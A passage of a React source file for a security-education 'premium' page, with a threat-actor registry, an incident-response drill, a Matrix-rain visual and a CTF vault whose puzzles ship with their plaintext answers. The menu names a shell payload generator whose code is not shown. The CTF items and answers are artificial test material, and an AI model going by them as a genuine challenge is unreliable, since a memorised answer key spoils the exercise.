    target: "Industrial Control Systems (ICS), Power Grids",
    tools: "BlackEnergy, Industroyer, Olympic Destroyer",
    mitre: "G0034",
    desc: "Responsible for targeting the Ukrainian power grid in 2015/2016 and deployment of the destructive NotPetya worm in 2017."
  }
];

const ThreatActorDossier = () => {
  const [search, setSearch] = useState("");
  const [active, setActive] = useState(null);

  const filtered = ACTOR_DOSSIERS.filter(item => 
    item.name.toLowerCase().includes(search.toLowerCase()) || 
    item.origin.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between border-b border-white/5 pb-3">
        <h4 className="font-display font-bold text-sm text-brand-cyan tracking-wider uppercase flex items-center gap-2">
          <Users className="w-4 h-4 text-brand-cyan" /> Threat Actor Database
        </h4>
      </div>

      <div className="space-y-4 font-mono text-[0.62rem]">
        <input
          type="text"
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          placeholder="Filter APT registry database (e.g. Russia, Bear, Lazarus)..."
          className="w-full px-3 py-2 bg-black/40 border border-white/10 rounded font-mono text-xs text-white outline-none focus:border-brand-cyan placeholder-slate-600"
        />

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="bg-black/60 border border-white/5 rounded-xl p-3.5 space-y-2 max-h-[300px] overflow-auto">
            <span className="text-slate-500 font-bold uppercase block border-b border-white/5 pb-1">// ACTOR REGISTRY INDEX</span>
            <div className="space-y-1.5 pt-1">
              {filtered.map((actor, idx) => (
                <div
                  key={idx}
                  onClick={() => setActive(actor)}
                  className={`p-2 rounded border cursor-pointer transition-all flex justify-between items-center ${active?.name === actor.name ? "bg-brand-cyan/20 border-brand-cyan/45 text-brand-cyan" : "bg-white/5 border-white/5 text-slate-300 hover:bg-white/10"}`}
                >
                  <span className="font-bold">{actor.name}</span>
                  <span className="text-slate-500 uppercase tracking-widest text-[0.52rem]">{actor.origin}</span>
                </div>
              ))}
            </div>
          </div>

          <div className="bg-black/60 border border-brand-cyan/20 rounded-xl p-4 flex flex-col justify-between min-h-[220px]">
            {active ? (
              <div className="space-y-2.5 animate-fadeIn">
                <div className="flex justify-between items-center border-b border-white/5 pb-1.5">
                  <h5 className="font-display font-bold text-brand-cyan text-xs uppercase tracking-wider">{active.name}</h5>
                  <span className="text-[0.52rem] text-slate-400 font-bold">MITRE: {active.mitre}</span>
                </div>
                <div className="space-y-1 text-slate-300 text-[0.58rem]">
                  <div>ORIGIN CONTEXT: <span className="text-white font-bold">{active.origin}</span></div>
                  <div className="break-words">TARGET PROFILE: <span className="text-white">{active.target}</span></div>
                  <div>ATTACK ARSENAL: <span className="text-brand-pink font-semibold">{active.tools}</span></div>
                </div>
                <p className="font-sans text-slate-400 leading-normal text-xs border-t border-white/5 pt-2">
                  {active.desc}
                </p>
              </div>
            ) : (
              <div className="my-auto text-center text-slate-500 uppercase">
                // SELECT AN ACTOR TO COMPILE CYBER ATTACK INTEL DOSSIER
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

// ============================================================================
// MODULE 8: CYBER INCIDENT ROLEPLAY
// ============================================================================
const ROLEPLAY_STEPS = {
  START: {
    text: "ALERT: SOC monitors indicate anomalous outbound traffic patterns originating from the core payroll database (10.200.5.12) to a suspicious IP in a non-routing country. How do you respond?",
    choices: [
      { text: "1. Terminate the database container instantly to stop potential data leaks.", next: "ABORT_CONTAINER" },
      { text: "2. Isolate host network routes and initiate memory capture script for analysis.", next: "ISOLATE_ROUTE" },
      { text: "3. Ignore alert as false positive; payroll is runs checks periodically.", next: "LEAK_ESC" }
    ]
  },
  ABORT_CONTAINER: {
    text: "You force-terminated the payroll database immediately! While outbound traffic stopped, you corrupted active databases, causing production downtime and losing all volatile memory artifacts (meaning zero forensic logs). Action rated low.",
    choices: [
      { text: "[RE-INITIALIZE DRILL ROUTINE]", next: "START" }
    ]
  },
  LEAK_ESC: {
    text: "You ignored the telemetry flags. Within 12 hours, the host runs encryption stubs, and threat actors threaten to publish personal identifiers to darknet channels. Threat level: Critical Failure.",
    choices: [
      { text: "[RE-INITIALIZE DRILL ROUTINE]", next: "START" }
    ]
  },
  ISOLATE_ROUTE: {
    text: "Excellent containment! You isolated the core subnet routing while preserving the system state. Volatile forensic logs remain intact. Next, telemetry indicates a malicious cronjob triggered the activity. What do you do?",
    choices: [
      { text: "1. Delete the suspicious cronjob entry and clear user logs.", next: "CLEANUP_FAIL" },
      { text: "2. Track parent process ID (PPID) in memory to locate initial intrusion vector.", next: "TRACK_INTRUSION" }
    ]
  },
  CLEANUP_FAIL: {
    text: "You deleted the file, but without resolving the core vulnerability, the actor deploys a secondary backdoor vector in another system module within minutes. Action failed.",
    choices: [
      { text: "[RE-INITIALIZE DRILL ROUTINE]", next: "START" }
    ]
  },
  TRACK_INTRUSION: {
    text: "SUCCESSFUL RESOLUTION! Tracking the process chain maps the threat to an orphaned webapp container running a critical outdated package. You patch the code, secure the container framework, and generate full audit reports. Rank: SOC COMMANDER.",
    choices: [
      { text: "[RE-INITIALIZE DRILL ROUTINE]", next: "START" }
    ]
  }
};

const IncidentRoleplay = () => {
  const [state, setState] = useState("START");

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between border-b border-white/5 pb-3">
        <h4 className="font-display font-bold text-sm text-brand-cyan tracking-wider uppercase flex items-center gap-2">
          <BookOpen className="w-4 h-4 text-brand-cyan" /> Incident Commander simulator
        </h4>
      </div>

      <div className="space-y-4 font-mono text-[0.62rem]">
        <div className="bg-black/60 p-4 rounded-xl border border-white/5 space-y-4">
          <div className="text-slate-500 font-bold uppercase tracking-wider">// SOC LOG ANALYSIS:</div>
          <p className="font-sans text-xs text-slate-300 leading-relaxed">
            {ROLEPLAY_STEPS[state].text}
          </p>
        </div>

        <div className="grid grid-cols-1 gap-2.5">
          {ROLEPLAY_STEPS[state].choices.map((choice, idx) => (
            <button
              key={idx}
              onClick={() => setState(choice.next)}
              className="w-full text-left py-2.5 px-4 bg-white/5 hover:bg-white/10 border border-white/5 hover:border-brand-cyan/20 rounded transition-all text-xs text-slate-300 font-semibold cursor-pointer active:scale-95"
            >
              {choice.text}
            </button>
          ))}
        </div>
      </div>
    </div>
  );
};

// ============================================================================
// MODULE 9: MATRIX RAIN CANVAS
// ============================================================================
const MatrixRainCustomizer = () => {
  const canvasRef = useRef(null);
  const [color, setColor] = useState("#00ff88"); // default green
  const [speed, setSpeed] = useState(30);
  const [charset, setCharset] = useState("HEX");

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    
    let width = (canvas.width = canvas.parentElement?.offsetWidth || 400);
    let height = (canvas.height = 160);

    const charSets = {
      BINARY: "01",
      HEX: "0123456789ABCDEF",
      CYPHER: "☠☢☣⚡⚔⚓⚓⚙⚛"
    };

    const alphabet = charSets[charset];
    const fontSize = 10;
    const columns = width / fontSize;
    const rainDrops = Array.from({ length: columns }).fill(1);

    let animeId;
    const draw = () => {
      ctx.fillStyle = "rgba(0, 0, 0, 0.08)";
      ctx.fillRect(0, 0, width, height);

      ctx.fillStyle = color;
      ctx.font = fontSize + "px monospace";

      for (let i = 0; i < rainDrops.length; i++) {
        const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
        ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);

        if (rainDrops[i] * fontSize > height && Math.random() > 0.975) {
          rainDrops[i] = 0;
        }
        rainDrops[i]++;
      }
    };

    const interval = setInterval(draw, speed);
    return () => clearInterval(interval);
  }, [color, speed, charset]);

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between border-b border-white/5 pb-3">
        <h4 className="font-display font-bold text-sm text-brand-cyan tracking-wider uppercase flex items-center gap-2">
          <Settings className="w-4 h-4 text-brand-cyan" /> Matrix Rain Generator
        </h4>
      </div>

      <div className="space-y-4 font-mono text-[0.62rem]">
        <div className="grid grid-cols-3 gap-3">
          <div className="space-y-1">
            <span className="text-slate-500">GLYPH SET:</span>
            <select
              value={charset}
              onChange={(e) => setCharset(e.target.value)}
              className="w-full bg-black/40 border border-white/10 rounded p-1.5 text-white outline-none focus:border-brand-cyan"
            >
              <option value="BINARY">BINARY (01)</option>
              <option value="HEX">HEXADECIMAL</option>
              <option value="CYPHER">CYPHER SIGILS</option>
            </select>
          </div>

          <div className="space-y-1">
            <span className="text-slate-500">HEX MATRIX COLOR:</span>
            <input
              type="color"
              value={color}
              onChange={(e) => setColor(e.target.value)}
              className="w-full h-8 bg-transparent border-0 cursor-pointer outline-none"
            />
          </div>

          <div className="space-y-1">
            <span className="text-slate-500">STREAM LATENCY:</span>
            <select
              value={speed}
              onChange={(e) => setSpeed(Number(e.target.value))}
              className="w-full bg-black/40 border border-white/10 rounded p-1.5 text-white outline-none focus:border-brand-cyan"
            >
              <option value={50}>SLOW FREQUENCY</option>
              <option value={30}>DEFAULT BITRATE</option>
              <option value={15}>TURBO CLOCK</option>
            </select>
          </div>
        </div>

        <div className="border border-white/10 rounded-xl overflow-hidden bg-black h-40">
          <canvas ref={canvasRef} className="w-full h-full block" />
        </div>
      </div>
    </div>
  );
};

// ============================================================================
// MODULE 10: CTF CHALLENGE VAULT
// ============================================================================
const CTF_CHALLENGES = [
  {
    id: 1,
    title: "Obfuscated Vector Decrypt",
    clue: "Flag encoded inside Caesar Shift (ROT13 style): flag{c3agvsl_npprff_tenagrq}",
    answer: "flag{premium_access_granted}"
  },
  {
    id: 2,
    title: "Base64 Hash Translation",
    clue: "Decode the volatile Base64 string payload: ZmxhZ3tiYXNlNjRfZGVjb2RlZF9zdWNjZXNzfQ==",
    answer: "flag{base64_decoded_success}"
  },
  {
    id: 3,
    title: "Binary Registry String",
    clue: "Convert byte registers to plaintext: 01100110 01101100 01100001 01100111 01111011 01100010 01101001 01101110 01100001 01110010 01111001 01011111 01101101 01100001 01110011 01110100 01100101 01110010 01111101",
    answer: "flag{binary_master}"
  }
];

const CtfVault = () => {
  const [solves, setSolves] = useState(() => {
    try {
      const stored = localStorage.getItem("premium_ctf_solves");
      return stored ? JSON.parse(stored) : {};
    } catch {
      return {};
    }
  });

  const [inputs, setInputs] = useState({ 1: "", 2: "", 3: "" });
  const [errors, setErrors] = useState({});

  const handleVerify = (id) => {
    const target = CTF_CHALLENGES.find(c => c.id === id);
    const userVal = inputs[id].trim();
    
    if (userVal === target.answer) {
      const newSolves = { ...solves, [id]: true };
      setSolves(newSolves);
      localStorage.setItem("premium_ctf_solves", JSON.stringify(newSolves));
      setErrors(prev => ({ ...prev, [id]: null }));
    } else {
      setErrors(prev => ({ ...prev, [id]: "❌ INVALID FLAG SEQUENCE" }));
    }
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between border-b border-white/5 pb-3">
        <h4 className="font-display font-bold text-sm text-brand-cyan tracking-wider uppercase flex items-center gap-2">
          <Award className="w-4 h-4 text-brand-cyan animate-bounce" /> CTF Challenge Vault
        </h4>
        <span className="font-mono text-[0.62rem] text-slate-400">
          Solved: {Object.keys(solves).filter(k => solves[k]).length}/{CTF_CHALLENGES.length}
        </span>
      </div>

      <div className="space-y-3 font-mono text-[0.62rem]">
        {CTF_CHALLENGES.map((ctf) => {
          const isSolved = !!solves[ctf.id];
          return (
            <div key={ctf.id} className={`p-3 rounded-lg border transition-all ${isSolved ? "bg-brand-green/5 border-brand-green/20" : "bg-black/60 border-white/5"}`}>
              <div className="flex justify-between items-center mb-1.5">
                <span className="font-bold text-white uppercase">{ctf.title}</span>
                {isSolved ? (
                  <span className="text-[0.52rem] font-bold text-brand-green tracking-widest border border-brand-green/20 bg-brand-green/5 px-1 rounded flex items-center gap-1">
                    <Check className="w-2.5 h-2.5" /> DECRYPTED
                  </span>
                ) : (
                  <span className="text-[0.52rem] text-slate-500 uppercase">// ACTIVE PUZZLE</span>
                )}
              </div>
              <p className="font-sans text-slate-400 leading-normal mb-2 text-xs">
                {ctf.clue}
              </p>
              
              {!isSolved && (
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={inputs[ctf.id] || ""}
                    onChange={(e) => setInputs(prev => ({ ...prev, [ctf.id]: e.target.value }))}
                    placeholder="flag{...}"
                    className="flex-1 px-2.5 py-1.5 bg-black/40 border border-white/10 rounded text-xs text-white outline-none focus:border-brand-cyan"
                  />
                  <button
                    onClick={() => handleVerify(ctf.id)}
                    className="px-3 bg-brand-cyan/20 border border-brand-cyan/35 text-brand-cyan font-bold uppercase rounded cursor-pointer hover:bg-brand-cyan/35 active:scale-95 transition-all"
                  >
                    DEPLOY
                  </button>
                </div>
              )}

              {errors[ctf.id] && !isSolved && (
                <div className="text-brand-pink text-[0.58rem] mt-1 font-bold">
                  {errors[ctf.id]}
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
};

// ============================================================================
// MAIN PAGE COMPONENT
// ============================================================================
const PREMIUM_MENU = [
  { id: "trivia", name: "Hacker Trivia Quiz", cat: "GAME", desc: "Test your OWASP & security lore vectors.", icon: <Trophy className="w-4 h-4" /> },
  { id: "typing", name: "Console Typing Injector", cat: "GAME", desc: "Input real core commands at speed.", icon: <Terminal className="w-4 h-4" /> },
  { id: "phish", name: "Phishing Audit Matrix", cat: "GAME", desc: "Audit real vs fake phishing templates.", icon: <Shield className="w-4 h-4" /> },
  { id: "duel", name: "Cryptographic Duel", cat: "GAME", desc: "Race against an AI decoding engine.", icon: <Activity className="w-4 h-4" /> },
  { id: "jwt", name: "JWT Signature Manipulator", cat: "TOOL", desc: "Manipulate signatures & algorithm checks.", icon: <Key className="w-4 h-4" /> },
  { id: "payload", name: "Payload Generator Pipeline", cat: "TOOL", desc: "Construct multi-format shells client-side.", icon: <Zap className="w-4 h-4" /> },
  { id: "apt", name: "Threat Actor Registry", cat: "INTEL", desc: "Analyze APT history dossiers.", icon: <Users className="w-4 h-4" /> },
  { id: "incident", name: "Incident Commander RPG", cat: "GAME", desc: "Roleplay choices inside a live cyber crisis.", icon: <BookOpen className="w-4 h-4" /> },
  { id: "matrix", name: "Matrix Rain Generator", cat: "VIZ", desc: "Configure custom console rain grids.", icon: <Settings className="w-4 h-4" /> },
  { id: "ctf", name: "CTF Challenge Vault", cat: "GAME", desc: "Decrypt exclusive hidden flag codes.", icon: <Award className="w-4 h-4" /> }
];

export default function Premium({ authUser }) {
  const [activeId, setActiveId] = useState("trivia");

  if (!authUser) {
    return (
      <div className="min-h-[70vh] flex items-center justify-center py-12 px-4 animate-fadeIn">
        <div className="glass-panel p-8 max-w-md w-full text-center space-y-6 border border-brand-purple/20 relative overflow-hidden">
          <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-brand-purple/40 to-brand-purple" />
          <div className="w-14 h-14 bg-brand-purple/10 border border-brand-purple/35 rounded-full flex items-center justify-center text-brand-purple mx-auto animate-pulse">
            <Lock className="w-6 h-6" />
          </div>
          <div className="space-y-2">
            <h3 className="font-display text-lg font-bold text-white uppercase tracking-wider flex items-center justify-center gap-1.5">
              <Sparkles className="w-4 h-4 text-brand-purple" /> Classified Premium Hub
            </h3>
            <p className="text-slate-400 font-sans text-xs leading-normal">
              Register or sign in to a <strong>FREE</strong> security account credentials token to access exclusive cyber games, tools, ciphers, and APT directories. No payment vectors required.
            </p>
          </div>
          <Link
            to="/portal"
            className="block w-full py-2.5 bg-brand-purple/20 hover:bg-brand-purple/30 border border-brand-purple/40 text-brand-purple font-mono text-xs rounded uppercase font-bold tracking-widest cursor-pointer active:scale-95 transition-all no-underline text-center"
          >
            🔓 Unlock Free Premium Access
          </Link>
          <div className="font-mono text-[0.55rem] text-slate-500 uppercase tracking-widest">
            STATUS: SECURE TERMINAL PORT BUFFER GATED
          </div>
        </div>
      </div>
    );
  }

  const renderActiveModule = () => {
    switch (activeId) {
      case "trivia": return <TriviaQuiz />;
      case "typing": return <TypingTerminal />;
      case "phish": return <SocialEngineeringSim />;
      case "duel": return <CipherDuel />;
      case "jwt": return <JwtDecoder />;
      case "payload": return <PayloadGenerator />;
      case "apt": return <ThreatActorDossier />;
      case "incident": return <IncidentRoleplay />;
      case "matrix": return <MatrixRainCustomizer />;
      case "ctf": return <CtfVault />;
      default: return <TriviaQuiz />;
    }
  };

  return (
    <section className="py-12 animate-fadeIn space-y-8">
      <div className="flex justify-between items-start border-b border-white/5 pb-4 mb-4">
        <div>
          <SectionHeader num="09" title="Classified Premium Sector" />
          <p className="font-mono text-[0.62rem] text-slate-400 -mt-6 uppercase tracking-wider flex items-center gap-1 text-brand-cyan font-bold">
            <ShieldCheck className="w-3.5 h-3.5" /> SECURITY SYSTEM STATUS: AUTHORIZED AGENT ACCESS (100% FREE)
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
        {/* Left Side: Module Selector Menu */}
        <div className="lg:col-span-4 bg-black/60 rounded-2xl border border-white/5 p-4 space-y-3 max-h-[600px] overflow-auto">
          <span className="text-slate-500 font-mono text-[0.58rem] font-bold uppercase block border-b border-white/5 pb-1">
            // Premium Command Directory
          </span>
          <div className="space-y-1.5 pt-1">
            {PREMIUM_MENU.map((item) => (
              <button
                key={item.id}
                onClick={() => setActiveId(item.id)}
                className={`w-full p-2.5 rounded text-left border font-mono transition-all flex items-center gap-3 cursor-pointer ${activeId === item.id ? "bg-brand-cyan/20 border-brand-cyan/45 text-brand-cyan font-bold" : "bg-white/5 border-white/5 text-slate-300 hover:bg-white/10 hover:border-white/10"}`}
              >
                <div className={`p-1.5 rounded bg-white/5 border border-white/5 ${activeId === item.id ? "text-brand-cyan bg-brand-cyan/10" : "text-slate-400"}`}>
                  {item.icon}
                </div>
                <div className="flex-1">
                  <div className="flex justify-between items-center">
                    <span className="text-[0.68rem] font-bold leading-none">{item.name}</span>
                    <span className="text-[0.48rem] border border-white/10 px-1 py-0.5 rounded text-slate-500 uppercase tracking-widest leading-none font-bold bg-black">
                      {item.cat}
                    </span>
                  </div>
                  <span className="text-[0.55rem] text-slate-500 block font-sans font-normal mt-0.5 leading-tight">{item.desc}</span>
                </div>
              </button>
            ))}
          </div>
        </div>

        {/* Right Side: Active Viewport Container */}
        <div className="lg:col-span-8 glass-panel p-6 sm:p-8 border border-brand-cyan/20 rounded-2xl relative min-h-[420px] flex flex-col justify-between">
          <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-brand-cyan/30 to-brand-cyan" />
          
          <div className="flex-1">
            {renderActiveModule()}
          </div>

          <div className="mt-8 border-t border-white/5 pt-3.5 flex justify-between items-center font-mono text-[0.52rem] text-slate-500 uppercase tracking-widest">
            <span>Sub-Processor Active Pipeline</span>
            <span>Agent ID: {authUser.email}</span>
          </div>
        </div>
      </div>
    </section>
  );
}
